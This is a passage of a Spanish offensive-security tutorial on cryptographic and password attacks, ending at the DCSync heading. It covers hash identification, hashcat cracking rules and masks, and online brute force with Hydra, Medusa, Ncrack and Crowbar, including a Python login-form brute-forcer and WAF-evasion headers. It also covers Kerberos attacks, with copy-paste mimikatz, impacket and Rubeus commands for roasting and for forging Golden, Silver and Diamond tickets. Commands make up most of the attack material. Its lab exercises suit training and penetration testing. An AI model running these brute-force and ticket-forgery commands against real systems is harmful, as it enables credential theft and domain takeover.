# 🧨 Criptografía para Hackers — Ataques Criptográficos

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2503 lineas)


> **Versión:** 1.0  
> **Idioma:** Español (argentino) — informal, directo, para la comunidad  
> **Nivel:** Intermedio → Avanzado  
> **Duración estimada:** 2–3 semanas leyendo y practicando

---

## 📚 Índice

1. [Introducción](#1-introducción)
2. [Password Cracking — Fundamentos](#2-password-cracking--fundamentos)
    - 2.1 [Hash Formats — Cómo identificarlos](#21-hash-formats--cómo-identificarlos)
    - 2.2 [LM vs NTLM — La batalla de los hashes de Windows](#22-lm-vs-ntlm--la-batalla-de-los-hashes-de-windows)
    - 2.3 [MD5, SHA1, SHA2 — La familia de los hash](#23-md5-sha1-sha2--la-familia-de-los-hash)
    - 2.4 [Identificación automática con hashid y hash-identifier](#24-identificación-automática-con-hashid-y-hash-identifier)
    - 2.5 [Ejercicios prácticos](#25-ejercicios-prácticos)
3. [Hash Cracking Optimization](#3-hash-cracking-optimization)
    - 3.1 [Rules — best64, d3ad0ne, dive, OneRuleToRuleThemAll](#31-rules--best64-d3ad0ne-dive-oneruletorulethemall)
    - 3.2 [Combinator Attacks](#32-combinator-attacks)
    - 3.3 [Mask Attacks](#33-mask-attacks)
    - 3.4 [Keyboard Walking](#34-keyboard-walking)
    - 3.5 [Prince Attack](#35-prince-attack)
    - 3.6 [Toggle Case](#36-toggle-case)
    - 3.7 [Ejercicios prácticos](#37-ejercicios-prácticos)
4. [Online Password Attacks](#4-online-password-attacks)
    - 4.1 [Hydra — El rey de los bruteforce online](#41-hydra--el-rey-de-los-bruteforce-online)
    - 4.2 [Medusa — El competidor directo](#42-medusa--el-competidor-directo)
    - 4.3 [Ncrack — Enfocado en servicios](#43-ncrack--enfocado-en-servicios)
    - 4.4 [Crowbar — Bruteforce con claves SSH](#44-crowbar--bruteforce-con-claves-ssh)
    - 4.5 [HTTP Basic Auth y Form Brute Force](#45-http-basic-auth-y-form-brute-force)
    - 4.6 [Ejercicios prácticos](#46-ejercicios-prácticos)
5. [Kerberos Attacks](#5-kerberos-attacks)
    - 5.1 [AS-REP Roasting](#51-as-rep-roasting)
    - 5.2 [Kerberoasting](#52-kerberoasting)
    - 5.3 [Golden Ticket](#53-golden-ticket)
    - 5.4 [Silver Ticket](#54-silver-ticket)
    - 5.5 [Diamond Ticket](#55-diamond-ticket)
    - 5.6 [DCSync](#56-dcsync)
    - 5.7 [Ejercicios prácticos](#57-ejercicios-prácticos)
6. [NTLM Relay Attacks](#6-ntlm-relay-attacks)
    - 6.1 [Responder — El cazador de hashes](#61-responder--el-cazador-de-hashes)
    - 6.2 [ntlmrelayx — El relay propiamente dicho](#62-ntlmrelayx--el-relay-propiamente-dicho)
    - 6.3 [SMB Relay](#63-smb-relay)
    - 6.4 [HTTP Relay](#64-http-relay)
    - 6.5 [LDAP Relay](#65-ldap-relay)
    - 6.6 [Relaying to AD CS](#66-relaying-to-ad-cs)
    - 6.7 [Ejercicios prácticos](#67-ejercicios-prácticos)
7. [TLS Attack Surface](#7-tls-attack-surface)
    - 7.1 [Certificate Validation Bypass](#71-certificate-validation-bypass)
    - 7.2 [Self-Signed Cert Exploits](#72-self-signed-cert-exploits)
    - 7.3 [STARTTLS Stripping](#73-starttls-stripping)
    - 7.4 [ALPACA Attack](#74-alpaca-attack)
    - 7.5 [TLS 1.0/1.1 Downgrade](#75-tls-1011-downgrade)
    - 7.6 [ROBOT Attack](#76-robot-attack)
    - 7.7 [POODLE](#77-poodle)
    - 7.8 [BEAST](#78-beast)
    - 7.9 [CRIME](#79-crime)
    - 7.10 [BREACH](#710-breach)
    - 7.11 [HEARTBLEED](#711-heartbleed)
    - 7.12 [Ejercicios prácticos](#712-ejercicios-prácticos)
8. [Padding Oracle Attacks](#8-padding-oracle-attacks)
    - 8.1 [Cómo funcionan los padding oracle](#81-cómo-funcionan-los-padding-oracle)
    - 8.2 [Padbuster — Herramienta clásica](#82-padbuster--herramienta-clásica)
    - 8.3 [Poracle — La versión moderna](#83-poracle--la-versión-moderna)
    - 8.4 [CBC-MAC Confusion](#84-cbc-mac-confusion)
    - 8.5 [ASP.NET Padding Oracle](#85-aspnet-padding-oracle)
    - 8.6 [Ejercicios prácticos](#86-ejercicios-prácticos)
9. [Known Attacks on Symmetric Crypto](#9-known-attacks-on-symmetric-crypto)
    - 9.1 [ECB Byte-at-a-Time](#91-ecb-byte-at-a-time)
    - 9.2 [CBC Bit Flipping](#92-cbc-bit-flipping)
    - 9.3 [CTR Nonce Reuse](#93-ctr-nonce-reuse)
    - 9.4 [AES-GCM Nonce Reuse](#94-aes-gcm-nonce-reuse)
    - 9.5 [Ejercicios prácticos](#95-ejercicios-prácticos)
10. [Known Attacks on Asymmetric Crypto](#10-known-attacks-on-asymmetric-crypto)
    - 10.1 [RSA Small e — Hastad Attack](#101-rsa-small-e--hastad-attack)
    - 10.2 [Wiener Attack — d muy chico](#102-wiener-attack--d-muy-chico)
    - 10.3 [Common Modulus Attack](#103-common-modulus-attack)
    - 10.4 [RSA Blinding Attack](#104-rsa-blinding-attack)
    - 10.5 [RSA Fault Attacks](#105-rsa-fault-attacks)
    - 10.6 [ECC — Invalid Curve Attack](#106-ecc--invalid-curve-attack)
    - 10.7 [ECC — Twist Security](#107-ecc--twist-security)
    - 10.8 [Ejercicios prácticos](#108-ejercicios-prácticos)
11. [Hash Length Extension Attack](#11-hash-length-extension-attack)
    - 11.1 [¿Cómo funciona?](#111-cómo-funciona)
    - 11.2 [Hashpumpy — La herramienta](#112-hashpumpy--la-herramienta)
    - 11.3 [Explotando esquemas de firma vulnerables](#113-explotando-esquemas-de-firma-vulnerables)
    - 11.4 [Ejercicios prácticos](#114-ejercicios-prácticos)
12. [Weak PRNG / Entropy](#12-weak-prng--entropy)
    - 12.1 [Prediciendo números aleatorios](#121-prediciendo-números-aleatorios)
    - 12.2 [PHP rand() — El desastre](#122-php-rand--el-desastre)
    - 12.3 [Java Random](#123-java-random)
    - 12.4 [glibc random](#124-glibc-random)
    - 12.5 [Windows CryptGenRandom](#125-windows-cryptgenrandom)
    - 12.6 [Ejercicios prácticos](#126-ejercicios-prácticos)
13. [Crypto Mining and Coin Analysis](#13-crypto-mining-and-coin-analysis)
    - 13.1 [Transaction Graph Analysis](#131-transaction-graph-analysis)
    - 13.2 [Blockchain Analysis](#132-blockchain-analysis)
    - 13.3 [Wallet Clustering](#133-wallet-clustering)
    - 13.4 [CoinJoin Analysis](#134-coinjoin-analysis)
    - 13.5 [Ejercicios prácticos](#135-ejercicios-prácticos)
14. [Apéndice A — Referencia rápida de comandos](#14-apéndice-a--referencia-rápida-de-comandos)
15. [Apéndice B — Wordlists recomendadas](#15-apéndice-b--wordlists-recomendadas)
16. [Apéndice C — Glosario](#16-apéndice-c--glosario)

---

## 1. Introducción

Bienvenido, hermano. Esto no es un paper académico. Esto es una guía de trinchera para entender los ataques criptográficos desde el lado ofensivo. Acá no vamos a dormirnos con definiciones aburridas de qué es un [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) de bloque — vamos directo a cómo romperlos.

La criptografía es una de esas areas donde los hackeres suelen flaquear. Configuran [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) mal, usan cifrados viejos, reusan IVs, o directamente implementan su propio algoritmo "más seguro". Un hacker que entiende criptografía no solo sabe cómo romper contraseñas, sino que tambien entiende por qué un sistema es vulnerable aunque use [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-256.

En este tutorial vamos a cubrir:

- **Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)** — desde identificar formatos de [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) hasta aplicar reglas avanzadas de [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat).
- **Ataques online** — [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra), medusa, ncrack para cuando tenés acceso a un servicio.
- **Kerberos** — [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting), [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting), golden tickets, [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync). Todo el arsenal de [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md).
- **NTLM relay** — [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder), ntlmrelayx, relay a [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) CS. Skeletons en el closet de Microsoft.
- **[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)** — downgrade, stripping, ROBOT, POODLE, HEARTBLEED. Cada [cve](../raw/s3c-f0nd4m3nt0s.md#cve) famoso.
- **Padding oracle** — porque los oráculos no solo están en Delphi.
- **Criptografía simétrica** — ECB byte-at-a-time, CBC bit flipping, CTR nonce reuse.
- **Criptografía asimétrica** — [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) con e chico, Wiener, common modulus, ECC invalid curve.
- **Hash length extension** — cuando MD5/SHA1 te juegan en contra.
- **PRNG débiles** — predecir rand() de PHP, Java, glibc.
- **Crypto y [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain)** — análisis de transacciones, clustering de wallets, coinjoin.

Cada sección tiene:
1. **Teoría** — lo mínimo necesario para entender el ataque.
2. **Comandos** — copypasteable, funcional.
3. **Código** — [python](../raw/pyth0n-f0r-h4ck1ng.md), bash, lo que haga falta.
4. **Ejercicios** — para que practiques y no te olvides.

### ¿Qué necesitás?

- Una Kali Linux o Parrot OS (o cualquier Linux con las herramientas).
- Hashcat (última versión).
- Python 3 con pycryptodome, pwntools, requests.
- Ganas de romper cosas.

Arrancamos.

---

## 2. Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) — Fundamentos

### 2.1 [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Formats — Cómo identificarlos

Antes de romper un hash, tenés que saber QUÉ estás mirando. No es lo mismo un MD5 que un NTLM que un bcrypt. Cada formato tiene una estructura, un tamaño y un prefijo distinto.

#### Formatos más comunes

| Hash | Longitud (hex) | Prefijo | Ejemplo |
|------|----------------|---------|---------|
| MD5 | 32 caracteres | — | `5d41402abc4b2a76b9719d911017c592` |
| SHA1 | 40 caracteres | — | `a94a8fe5ccb19ba61c4c0873d391e987982fbbd3` |
| SHA256 | 64 caracteres | — | `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` |
| SHA512 | 128 caracteres | — | `ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff` |
| NTLM | 32 caracteres | — | `b4b9b02e6f09a9bd760f388b67351e2b` |
| LM | 32 caracteres (split en 2 mitades) | — | `aad3b435b51404eeaad3b435b51404ee` (LM hash vacío) |
| bcrypt | 60 caracteres | `$2a$`, `$2b$`, `$2y$` | `$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy` |
| SHA256Crypt | 55 caracteres | `$5$` | `$5$rounds=5000$usesomesillystri$KqJWpXw` |
| SHA512Crypt | 86 caracteres | `$6$` | `$6$rounds=656000$...` |
| MD5Crypt | 34–36 caracteres | `$1$` | `$1$salt$hash` |
| MySQL 4.1+ | 41 caracteres | `*` | `*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4` |
| PostgreSQL | 35 caracteres | `md5` | `md55d41402abc4b2a76b9719d911017c592` |

#### Cómo leer un hash a ojo

1. **Mirá la longitud.** 32 hex = puede ser MD5, NTLM, LM, MD4.
2. **Fijate si tiene prefijo.** `$2a$` = bcrypt, `$5$` = SHA256-Crypt, `$6$` = SHA512-Crypt.
3. **Fijate si tiene separador `:`.** Si tiene dos puntos, es hash con salt: `hash:salt`.
4. **Fijate si es todo hex.** Si tiene `+`, `/`, `$`, es base64 o formato especial.
5. **Contexto.** Si viene de Windows y parece MD5 -> es NTLM.

#### Regla mnemotécnica

- **32 hex sin prefijo:** MD5, NTLM, LM, MD4.
- **40 hex:** SHA1.
- **56 hex:** SHA224.
- **64 hex:** SHA256.
- **96 hex:** SHA384.
- **128 hex:** SHA512.
- **Empieza con `$2`:** bcrypt.
- **Empieza con `$5`:** SHA256-Crypt.
- **Empieza con `$6`:** SHA512-Crypt.
- **Empieza con `$1`:** MD5-Crypt.
- **Empieza con `$y$`:** yescrypt.
- **Empieza con `*`:** MySQL.
- **Empieza con `md5`:** PostgreSQL.

### 2.2 LM vs NTLM — La batalla de los hashes de Windows

#### LM Hash

LM (LAN Manager) es el hash más viejo de Windows. Es TAN inseguro que da risa.

**Cómo se genera LM:**
1. La contraseña se pasa a MAYÚSCULAS.
2. Si tiene menos de 14 caracteres, se rellena con ceros.
3. Se divide en dos mitades de 7 caracteres.
4. Cada mitad se usa como clave DES para cifrar `KGS!@#$%`.
5. Resultado: dos hashes de 8 bytes = 16 bytes = 32 chars hex.

¿Por qué es inseguro?
- Todo mayúsculas -> reduce espacio de búsqueda.
- Se divide en 2 mitades de 7 chars -> cada mitad se crackea por separado.
- DES es débil.

LM hash vacío: `aad3b435b51404eeaad3b435b51404ee`

#### NTLM Hash

**Cómo se genera NTLM:**
1. Contraseña en Unicode (UTF-16LE).
2. Se aplica MD4 (no MD5, MD4).

```
NTLM(pass) = MD4(UTF-16LE(pass))
```

¿Por qué sigue siendo débil?
- MD4 es rapidísimo. Sin salt. Sin iteraciones.

#### Cómo crackear LM

```bash
hashcat -m 3000 -a 3 lm_hashes.txt ?u?u?u?u?u?u?u
```

#### Cómo crackear NTLM

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r best64.rule
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a
```

### 2.3 MD5, SHA1, SHA2 — La familia de los hash

#### MD5
- Output: 128 bits (32 hex chars).
- Diseñado por Ron Rivest en 1991.
- **ROTO.** Colisiones desde 2004.
- Velocidad en [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat): ~15 GH/s en GPU moderna.

```bash
hashcat -m 0 -a 3 hashes_md5.txt ?a?a?a?a?a?a?a?a
```

#### SHA1
- Output: 160 bits (40 hex chars).
- Diseñado por NSA en 1995.
- **ROTO.** SHAttered (2017).
- Velocidad: ~10 GH/s.

```bash
hashcat -m 100 -a 0 sha1_hashes.txt rockyou.txt
```

#### SHA2 (SHA256, SHA384, SHA512)
- SHA256: 256 bits (64 hex). Modo 1400.
- SHA384: 384 bits (96 hex). Modo 10800.
- SHA512: 512 bits (128 hex). Modo 1700.
- **NO ESTÁN ROTOS.**
- Velocidades: SHA256 ~5 GH/s, SHA512 ~1.5 GH/s.

```bash
hashcat -m 1400 -a 0 sha256_hashes.txt rockyou.txt
hashcat -m 1700 -a 0 sha512_hashes.txt rockyou.txt
```

#### Comparativa de velocidad (RTX 4090)

| Algoritmo | Velocidad (H/s) | Sensible a GPU |
|-----------|-----------------|----------------|
| MD5 | ~15000 MH/s | Máximo |
| NTLM | ~30000 MH/s | Máximo |
| SHA1 | ~10000 MH/s | Máximo |
| SHA256 | ~5000 MH/s | Alto |
| SHA512 | ~1500 MH/s | Alto |
| bcrypt ($2a$10) | ~100 KH/s | Bajo |
| scrypt | ~30 KH/s | Bajo |
| Argon2 | ~10 KH/s | Muy bajo |

### 2.4 Identificación automática con hashid y hash-identifier

#### hashid

```bash
hashid -m 5d41402abc4b2a76b9719d911017c592
```

#### hash-identifier

```bash
hash-identifier
```

#### [python](../raw/pyth0n-f0r-h4ck1ng.md) script casero

```python
#!/usr/bin/env python3
import re
import sys

def identify_hash(h):
    h = h.strip()
    if h.startswith('$2'): return 'bcrypt'
    if h.startswith('$5'): return 'SHA256-Crypt'
    if h.startswith('$6'): return 'SHA512-Crypt'
    if h.startswith('$1'): return 'MD5-Crypt'
    if h.startswith('$y$'): return 'yescrypt'
    if h.startswith('*'): return 'MySQL 4.1+'
    if h.startswith('md5'): return 'PostgreSQL'
    if re.match(r'^[a-f0-9]{32}$', h, re.I): return 'MD5 / NTLM / LM / MD4'
    if re.match(r'^[a-f0-9]{40}$', h, re.I): return 'SHA1'
    if re.match(r'^[a-f0-9]{64}$', h, re.I): return 'SHA256'
    if re.match(r'^[a-f0-9]{128}$', h, re.I): return 'SHA512'
    return 'Unknown'

if __name__ == '__main__':
    print(identify_hash(sys.argv[1]))
```

### 2.5 Ejercicios prácticos

**Ejercicio 1:** Identificá los siguientes hashes:
1. `$1$salty$h6h3W0E7K3i1q5z8q5w7a0`
2. `5f4dcc3b5aa765d61d8327deb882cf99`
3. `8846f7eaee8fb117ad06bdd830b7586c`
4. `b4b9b02e6f09a9bd760f388b67351e2b`

**Ejercicio 2:** Descargá `hash-identifier` y pasale cada hash del ejercicio 1.

**Ejercicio 3:** Convertí `Password123` a LM hash paso a paso.

**Ejercicio 4:** Creá un script Python que clasifique hashes automáticamente.

**Ejercicio 5:** Buscá 10 hashes de diferentes tipos en internet y practicá identificarlos.

---

## 3. [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) Optimization

### 3.1 Rules — best64, d3ad0ne, dive, OneRuleToRuleThemAll

Las reglas son el corazón del cracking eficiente. Una wordlist sola te da lo que la gente usa. Las reglas te dan variaciones.

#### ¿Qué es una regla?

Una regla en [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) es una serie de operaciones que se aplican a cada palabra.

```
$1     -> agrega "1" al final
so0    -> reemplaza "o" por "0"
l      -> todo minúsculas
u      -> todo mayúsculas
c      -> capitalizar
```

#### Sintaxis de reglas de hashcat

| Operador | Descripción | Ejemplo | Resultado |
|----------|-------------|---------|-----------|
| `l` | A minúsculas | `l` en `HELLO` | `hello` |
| `u` | A mayúsculas | `u` en `hello` | `HELLO` |
| `c` | Capitalizar | `c` en `hello` | `Hello` |
| `C` | Primera mayúscula, resto igual | `C` en `hELLO` | `hELLO` |
| `t` | Toggle case toda | `t` en `hello` | `HELLO` |
| `T` | Toggle case por posición | `T3` en `hello` | `helLo` |
| `r` | Reverse | `r` en `hello` | `olleh` |
| `d` | Duplicar | `d` en `hello` | `hellohello` |
| `p` | Duplicar al revés | `p` en `hello` | `helloolleh` |
| `{` | Rotar izquierda | `{` en `hello` | `elloh` |
| `}` | Rotar derecha | `}` en `hello` | `ohell` |
| `$X` | Agregar al final | `$1` en `hello` | `hello1` |
| `^X` | Agregar al inicio | `^!` en `hello` | `!hello` |
| `sXY` | Reemplazar X por Y | `so0` en `hello` | `hell0` |
| `@X` | Borrar todos los X | `@l` en `hello` | `heo` |
| `iNX` | Insertar X en pos N | `i3!` en `hello` | `hel!lo` |
| `oNX` | Sobrescribir pos N con X | `o3!` en `hello` | `hel!o` |
| `'N` | Truncar a N chars | `'3` en `hello` | `hel` |

#### Las reglas más famosas

**best64.rule** — Viene con hashcat. 64 reglas más efectivas.

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r best64.rule
```

**d3ad0ne.rule** — Más agresiva.

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r d3ad0ne.rule
```

**dive.rule** — De Atom (creador de hashcat). Enorme, cubre casi todo.

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r dive.rule
```

**OneRuleToRuleThemAll.rule** — Fusión de las mejores reglas.

```bash
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r OneRuleToRuleThemAll.rule
```

#### Reglas múltiples

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r best64.rule -r d3ad0ne.rule -r dive.rule
```

#### Reglas personalizadas

```bash
# mis_reglas.rule
c
c $1 $2 $3
so0
sa@
se3
si1
ss5
$1 $2 $3 $4 $5 $6 $7 $8 $9 $0
^!
```

#### Debugging de reglas

```bash
echo "password" | hashcat --stdout -r best64.rule
hashcat --stdout wordlist.txt -r dive.rule
```

### 3.2 Combinator Attacks

Toma dos palabras y las concatena.

```bash
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
hashcat -m 1000 -a 1 hashes.txt wordlist.txt wordlist.txt
```

#### Combinator + Rules

```bash
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt -r best64.rule
```

#### Con reglas por wordlist (-j, -k)

```bash
hashcat -m 1000 -a 1 hashes.txt w1.txt w2.txt -j 'c' -k '$1 $2 $3'
```

### 3.3 Mask Attacks

Definís exactamente el formato de la contraseña.

| Placeholder | Significado |
|-------------|-------------|
| `?l` | minúsculas (a-z) |
| `?u` | mayúsculas (A-Z) |
| `?d` | dígitos (0-9) |
| `?s` | símbolos |
| `?a` | ?l + ?u + ?d + ?s |
| `?h` | hex (a-f, 0-9) |
| `?b` | byte (0x00–0xFF) |

```bash
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d?d
```

#### Custom charsets

```bash
hashcat -m 1000 -a 3 hashes.txt ?1?1?1?1?d?d -1 aeiouAEIOU
```

#### Mask híbrido

```bash
# Wordlist + mask (modo 6)
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d

# Mask + wordlist (modo 7)
hashcat -m 1000 -a 7 hashes.txt ?u?u?u wordlist.txt
```

#### Optimización

```bash
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --increment --increment-min 6
```

### 3.4 Keyboard Walking

Patrones de teclado como `qwerty`, `asdfgh`, `1qaz2wsx`.

```python
python3 -c "
fila1 = 'qwertyuiop'
fila2 = 'asdfghjkl'
fila3 = 'zxcvbnm'
for i in range(3, 9):
    for start in range(len(fila1) - i + 1):
        print(fila1[start:start+i])
    for start in range(len(fila2) - i + 1):
        print(fila2[start:start+i])
    for start in range(len(fila3) - i + 1):
        print(fila3[start:start+i])
" > keyboard_patterns.txt

hashcat -m 1000 -a 0 hashes.txt keyboard_patterns.txt -r dive.rule
```

### 3.5 Prince Attack

PRINCE (PRobability INfinite Chunk Extractor) combina chunks de palabras.

```bash
hashcat -m 1000 -a 8 hashes.txt wordlist.txt
```

#### Parámetros

```bash
hashcat -m 1000 -a 8 hashes.txt wordlist.txt --prince-limit=1000000
hashcat -m 1000 -a 8 hashes.txt wordlist.txt --prince-min-elem=2 --prince-max-elem=4
```

### 3.6 Toggle Case

Variaciones de mayúsculas/minúsculas.

Usando reglas:
```
T0
T1
T2
T3
c
u
c $1 $2 $3
```

### 3.7 Ejercicios prácticos

**Ejercicio 1:** Descargá rockyou. Creá 100 hashes MD5. Crackerlos con best64, d3ad0ne, dive. Compará resultados.

**Ejercicio 2:** Creá tu regla personalizada que capitalice, agregue "2024", reemplace "a" por "@" y "s" por "$".

**Ejercicio 3:** Usá combinator attack con `nombres.txt` y `numeros.txt`. ¿Cuántas combinaciones genera?

**Ejercicio 4:** Analizá 10 contraseñas de tu entorno. Armá un mask attack para cada patrón.

**Ejercicio 5:** Generá 500 patrones de keyboard walking. Probá contra 50 hashes NTLM con dive.rule.

**Ejercicio 6:** Compará PRINCE vs combinator attack. ¿Cuál rinde más?

**Ejercicio 7:** Armá un [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) de cracking: rockyou -> best64 -> dive -> PRINCE -> mask -> reglas agresivas.

---

## 4. Online Password Attacks

### 4.1 [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra) — El rey de los bruteforce online

```bash
hydra -l usuario -P wordlist.txt servicio://target
hydra -L usuarios.txt -P passwords.txt servicio://target
```

#### SSH

```bash
hydra -l root -P rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P pass.txt ssh://192.168.1.100 -t 4
```

#### FTP

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.100
```

#### [http](../raw/r3d3s-f0nd4m3nt0s.md#http) (GET - Basic Auth)

```bash
hydra -l admin -P rockyou.txt http-get://192.168.1.100/admin/
```

#### HTTP POST (Formularios)

```bash
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
```

#### RDP

```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.100
```

#### [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)

```bash
hydra -l administrator -P rockyou.txt smb://192.168.1.100
```

#### MySQL / PostgreSQL

```bash
hydra -l root -P rockyou.txt mysql://192.168.1.100
hydra -l postgres -P rockyou.txt postgres://192.168.1.100
```

#### POP3 / IMAP

```bash
hydra -l user@domain.com -P rockyou.txt pop3://mail.server.com
```

#### Evasión de [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)

```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.100 -t 1 -W 30
```

### 4.2 Medusa

```bash
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh
medusa -h 192.168.1.100 -U users.txt -P pass.txt -M ftp
```

### 4.3 Ncrack

```bash
ncrack -u admin -P rockyou.txt ssh://192.168.1.100
ncrack -p 3389 --user administrator -P rockyou.txt 192.168.1.100
ncrack -iL targets.txt -U users.txt -P rockyou.txt -p ssh,rdp,ftp
```

### 4.4 Crowbar

```bash
crowbar -b sshkey -k id_rsa -u root -s 192.168.1.100/32
crowbar -b rdp -u administrator -C rockyou.txt -s 192.168.1.100/32
```

### 4.5 HTTP Basic Auth y Form Brute Force

#### Con curl

```bash
for pass in $(cat rockyou.txt); do
  status=$(curl -s -o /dev/null -w "%{http_code}" -u "admin:$pass" http://target/admin/)
  if [ "$status" != "401" ]; then echo "Found: $pass"; fi
done
```

#### Form Brute Force con [python](../raw/pyth0n-f0r-h4ck1ng.md)

```python
import requests
target = "http://192.168.1.100/login.php"
with open("rockyou.txt", "r", encoding="latin-1", errors="ignore") as f:
    for linea in f:
        password = linea.strip()
        r = requests.post(target, data={"user": "admin", "pass": password})
        if "Login failed" not in r.text:
            print(f"[+] {password}")
            break
```

#### Evasión de WAF

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "192.168.1.200",
}
```

### 4.6 Ejercicios prácticos

**Ejercicio 1:** Configurá un SSH honeypot en [docker](../raw/d0ck3r-f0r-h4ck3rs.md). Hacé [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) con Hydra. Probá 1, 4 y 16 threads.

**Ejercicio 2:** Levantá un servidor Flask con formulario de login. Hacé Hydra HTTP-POST-FORM.

**Ejercicio 3:** Usá Ncrack contra RDP en tu lab. Cronometrá 1000 contraseñas.

**Ejercicio 4:** Creá un script Python para formulario con [csrf](../raw/w3b-h4ck1ng.md#csrf) token. Extraé token, enviá POST.

**Ejercicio 5:** Probá Crowbar con clave SSH protegida por passphrase.

**Ejercicio 6:** Simulá rate limiting (1 intento/10s). Calculá tiempo para toda rockyou.

---

## 5. Kerberos Attacks

### 5.1 [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)

Cuentas sin pre-autenticación Kerberos. Cualquiera puede pedir un TGT.

```bash
impacket-GetNPUsers -dc-ip 192.168.1.100 -request dominio.local/usuarios.txt
```

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
```

Detección:
```powershell
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}
```

### 5.2 [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting)

Cuentas de servicio con SPN. Cualquier usuario autenticado puede pedir un TGS.

```bash
impacket-GetUserSPNs -dc-ip 192.168.1.100 -request dominio.local/usuario:pass
```

```bash
hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt
```

Modos [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) para Kerberos:
- 13100 = TGS-REP tipo 23 (RC4)
- 18200 = AS-REP tipo 23
- 19600 = TGS-REP tipo 17 (AES128)
- 19700 = TGS-REP tipo 18 (AES256)

### 5.3 [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket)

TGT falso firmado con [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) KRBTGT. Acceso a cualquier recurso como cualquier usuario.

```bash
impacket-secretsdump -dc-ip 192.168.1.100 dominio.local/admin:pass@192.168.1.100
```

```cmd
mimikatz # kerberos::golden /user:Administrador /domain:dominio.local /sid:S-1-5-21-XXX /krbtgt:HASH /ptt
```

```bash
impacket-ticketer -nthash NTHASH_KRBTGT -domain-sid S-1-5-21-XXX -domain dominio.local Administrador
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass dominio.local/Administrador@DC.dominio.local
```

### 5.4 [silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket)

TGS falso para un servicio específico.

```cmd
mimikatz # kerberos::golden /user:Administrador /domain:dominio.local /sid:S-1-5-21-XXX /target:DC.dominio.local /service:CIFS /rc4:HASH /ptt
```

Servicios comunes: CIFS (archivos), [http](../raw/r3d3s-f0nd4m3nt0s.md#http) (IIS), MSSQLSvc (SQL), LDAP ([ad](../raw/w1nd0ws-d0m41n-4dm1n.md)), HOST (admin remota), WSMAN (WinRM), TERMSRV (RDP).

### 5.5 Diamond Ticket

TGT real modificado. Tiene número de serie válido, fecha real, pero privilegios alterados.

```cmd
Rubeus.exe diamond /user:UsuarioNormal /domain:dominio.local /password:pass /krbtgt:HASH /ticketuser:Administrador /groups:512 /ptt
```

### 5.6 [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync)

